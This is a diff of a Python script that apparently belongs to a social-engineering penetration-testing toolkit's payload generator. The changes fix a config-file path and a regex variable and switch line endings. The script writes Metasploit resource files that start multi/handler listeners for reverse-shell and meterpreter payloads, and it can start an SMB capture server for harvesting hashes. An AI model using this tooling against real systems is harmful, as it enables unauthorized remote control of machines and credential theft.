@@ -79,9 +79,9 @@ if os.path.isfile(setdir + "/payloadgen"):
 ####################################################################################################################################
 
 if check_options("IPADDR=") == False:
-    fileopen=file("config/set_config", "r")
+    fileopen=file(definepath + "/config/set_config", "r")
     data = fileopen.read()
-    match = re.search("AUTO_DETECT=ON", line)
+    match = re.search("AUTO_DETECT=ON", data)
     if match:
         try:
             ipaddr=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -366,7 +366,7 @@ try:
                                 filewrite = file("%s/meta_config_multipyinjector" % (setdir), "a")
                                 port_check = check_ports("%s/meta_config_multipyinjector" % (setdir), shellcode_port)
                                 if port_check == False:
-                                    filewrite.write("use exploit/multi/handler\nset PAYLOAD %s\nset EnableStageEncoding %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\n\n" % (choice9, stage_encoding,ipaddr, shellcode_port))
+                                    filewrite.write("use exploit/multi/handler\nset PAYLOAD %s\nset EnableStageEncoding %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\r\n\r\n" % (choice9, stage_encoding,ipaddr, shellcode_port))
                                     filewrite.close()
 
                             if validate_ip(choice2) == False:
@@ -656,12 +656,12 @@ try:
                         multiwrite.write(meterpreter_multi_command)
                         filewrite.write("set InitialAutorunScript multiscript -rc %s/multi_meter.file\n" % (setdir))
                         multiwrite.close()
-                    filewrite.write("exploit -j\n\n")
+                    filewrite.write("exploit -j\r\n\r\n")
 
                 # if we want to embed UNC paths for hashes
                 if unc_embed == "ON":
                     filewrite.write("use server/capture/smb\n")
-                    filewrite.write("exploit -j\n\n")
+                    filewrite.write("exploit -j\r\n\r\n")
 
                 # if only doing payloadgen then close the stuff up
                 if payloadgen == "solo": filewrite.close()
@@ -674,7 +674,7 @@ try:
                     filewrite.write("set LHOST "+choice2+"\n")
                     filewrite.write("set LPORT "+port1+"\n")
                     filewrite.write("set ExitOnSession false\n")
-                    filewrite.write("exploit -j\n\n")
+                    filewrite.write("exploit -j\r\n\r\n")
                     filewrite.write("use exploit/multi/handler\n")
                     filewrite.write("set PAYLOAD linux/x86/shell/reverse_tcp"+"\n")
                     filewrite.write("set LHOST "+choice2+"\n")
@@ -685,7 +685,7 @@ try:
                         filewrite.write("set InitialAutorunScript multiscript -rc %s/lin_multi_meter.file\n" % (setdir))
                         multiwrite.close()
                         filewrite.write("set ExitOnSession false\n")
-                    filewrite.write("exploit -j\n\n")
+                    filewrite.write("exploit -j\r\n\r\n")
             filewrite.close()
 
 
